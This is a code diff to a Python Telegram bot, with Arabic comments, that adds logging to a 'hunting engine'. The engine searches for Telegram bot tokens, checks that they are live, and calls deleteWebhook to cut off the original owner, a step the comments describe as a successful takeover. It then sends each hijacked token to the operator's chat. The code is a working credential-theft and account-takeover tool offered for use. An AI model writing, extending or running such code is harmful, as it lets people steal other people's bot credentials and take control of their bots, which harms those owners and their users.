@@ -53,26 +53,38 @@ def callback_query(call):
     except Exception as e:
         bot.send_message(CHAT_ID, f"خطأ في معالجة الطلب: {e}")
 
-# --- محرك الصيد مع نظام الاستحواذ ---
+# --- محرك الصيد مع نظام الاستحواذ والتشخيص ---
 def run_scanner():
+    print("[*] محرك الصيد بدأ العمل...")
     while True:
         try:
             tokens = search_for_tokens()
             for token in tokens:
                 if not os.path.exists(FOUND_FILE) or token not in open(FOUND_FILE).read():
-                    # التحقق من فعالية التوكن
-                    if requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=5).status_code == 200:
+                    print(f"[*] جاري فحص التوكن: {token[:10]}...")
+                    
+                    response = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=5)
+                    
+                    if response.status_code == 200:
+                        print(f"[+] توكن حي تم العثور عليه! جاري الاستحواذ...")
+                        
                         # نظام الاستحواذ التقني
                         try:
                             requests.get(f"https://api.telegram.org/bot{token}/deleteWebhook?drop_pending_updates=True", timeout=5)
-                        except: pass
+                            print("[+] تم قطع اتصال المالك الأصلي بنجاح.")
+                        except Exception as e:
+                            print(f"[!] فشل في الاستحواذ: {e}")
                         
                         bot.send_message(CHAT_ID, f"🔥 تم الاستحواذ بنجاح:\n`{token}`", 
                                          parse_mode="Markdown", reply_markup=get_markup(token))
+                        
                         with open(FOUND_FILE, "a") as f:
                             f.write(token + "\n")
+                    else:
+                        print(f"[-] توكن غير صالح (محذوف أو منتهي): {token[:10]}...")
         except Exception as e:
-            print(f"Scanner Loop Error: {e}")
+            print(f"[!] Scanner Loop Error: {e}")
+        
         time.sleep(60)
 
 # --- التشغيل الأساسي ---
